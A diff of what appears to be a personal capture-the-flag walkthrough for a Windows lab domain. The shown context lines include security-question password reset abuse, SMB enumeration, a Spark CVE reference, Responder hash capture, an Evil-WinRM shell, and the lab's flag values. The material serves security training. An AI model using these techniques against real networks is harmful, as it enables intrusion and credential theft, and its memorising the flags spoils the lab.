@@ -760,7 +760,6 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 140.71 seconds
 
-
 after looking the src code
                                                                                           
 ┌──(kali㉿kali)-[~/ra]
@@ -776,7 +775,6 @@ after looking the src code
             <p class="font-weight-light mb-0">"I love being able to bring my best friend to work with me!"</p>
 
 reset pass: lilyle      What's ur favorite pets name     Sparky
-
 
 Your password has been reset to: ChangeMe#1234
 Remember to change it after logging in! 
@@ -1039,7 +1037,6 @@ using credentials
         dr--r--r--                0 Thu Apr 30 19:35:11 2020    My Pictures
         dr--r--r--                0 Thu Apr 30 19:35:11 2020    My Videos
 
-
 A share called “Shared” was enumerated and we can see the flag and some executables. 
 
 ┌──(kali㉿kali)-[~/ra]
@@ -1086,14 +1083,9 @@ dpkg: error processing archive spark_2_8_3.deb (--install):
 Errors were encountered while processing:
  spark_2_8_3.deb
 
-
-
-
 ┌──(kali㉿kali)-[~/ra]
 └─$ cat Flag\ 1.txt 
 THM{466d52dc75a277d6c3f6c6fcbc716d6b62420f48}   
-
-
 
 https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md
 
@@ -1123,7 +1115,6 @@ first start responder to get hash pass
 
   Author: Laurent Gaffie (laurent.gaffie@gmail.com)
   To kill this script hit CTRL-C
-
 
 [+] Poisoners:
     LLMNR                      [ON]
@@ -1295,9 +1286,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\buse\Documents> cd ..\Desktop
 *Evil-WinRM* PS C:\Users\buse\Desktop> ls
 
-
     Directory: C:\Users\buse\Desktop
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -1306,7 +1295,6 @@ d-----         5/7/2020   2:58 AM                Stuff
 -a----         5/2/2020  11:53 AM             45 Flag 2.txt
 -a----         5/1/2020   8:33 AM             37 Notes.txt
 
-
 *Evil-WinRM* PS C:\Users\buse\Desktop> type 'Flag 2.txt'
 THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}
 *Evil-WinRM* PS C:\Users\buse\Desktop> type Notes.txt
@@ -1314,35 +1302,27 @@ I really should be better at taking n
 *Evil-WinRM* PS C:\Users\buse\Desktop> cd Stuff
 *Evil-WinRM* PS C:\Users\buse\Desktop\Stuff> ls
 
-
     Directory: C:\Users\buse\Desktop\Stuff
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 d-----         5/7/2020   2:58 AM                Passwords
 
-
 *Evil-WinRM* PS C:\Users\buse\Desktop\Stuff> cd Passwords
 *Evil-WinRM* PS C:\Users\buse\Desktop\Stuff\Passwords> ls
 
-
     Directory: C:\Users\buse\Desktop\Stuff\Passwords
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----         5/7/2020   2:58 AM              8 Facebook.txt
-
 
 *Evil-WinRM* PS C:\Users\buse\Desktop\Stuff\Passwords> type Facebook.txt
 password
 *Evil-WinRM* PS C:\Users\buse> cd ..
 *Evil-WinRM* PS C:\Users> ls
 
-
     Directory: C:\Users
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -1389,9 +1369,7 @@ At line:1 char:1
 *Evil-WinRM* PS C:\Users> cd ..
 *Evil-WinRM* PS C:\> ls
 
-
     Directory: C:\
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -1404,19 +1382,15 @@ d-----        5/29/2020   5:45 PM                Shared
 d-r---         5/2/2020   3:05 PM                Users
 d-----        5/30/2020   7:00 AM                Windows
 
-
 *Evil-WinRM* PS C:\> cd scripts
 *Evil-WinRM* PS C:\scripts> ls
 
-
     Directory: C:\scripts
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----         5/3/2020   5:53 AM           4119 checkservers.ps1
 -a----       11/22/2022  10:01 AM             31 log.txt
-
 
 *Evil-WinRM* PS C:\scripts> cat log.txt
 Last run: 11/22/2022 10:01:15
@@ -1563,7 +1537,6 @@ User Name     SID
 ============= ============================================
 windcorp\buse S-1-5-21-555431066-3599073733-176599750-5777
 
-
 GROUP INFORMATION
 -----------------
 
@@ -1582,7 +1555,6 @@ WINDCORP\IT                                 Group            S-1-5-21-555431066-
 NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -1591,7 +1563,6 @@ Privilege Name                Description                    State
 SeMachineAccountPrivilege     Add workstations to domain     Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
 
 USER CLAIMS INFORMATION
 -----------------------
@@ -1831,19 +1802,7 @@ THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}
 
 😊 
 
-
 ```
-
-![[Pasted image 20221122113124.png]]
-![[Pasted image 20221122113139.png]]
-
-![[Pasted image 20221122123956.png]]
-![[Pasted image 20221122124018.png]]
-![[Pasted image 20221122124525.png]]
-
-![[Pasted image 20221122124621.png]]
-
-![[Pasted image 20221122124839.png]]
 
 Flag 1
 *THM{466d52dc75a277d6c3f6c6fcbc716d6b62420f48}*
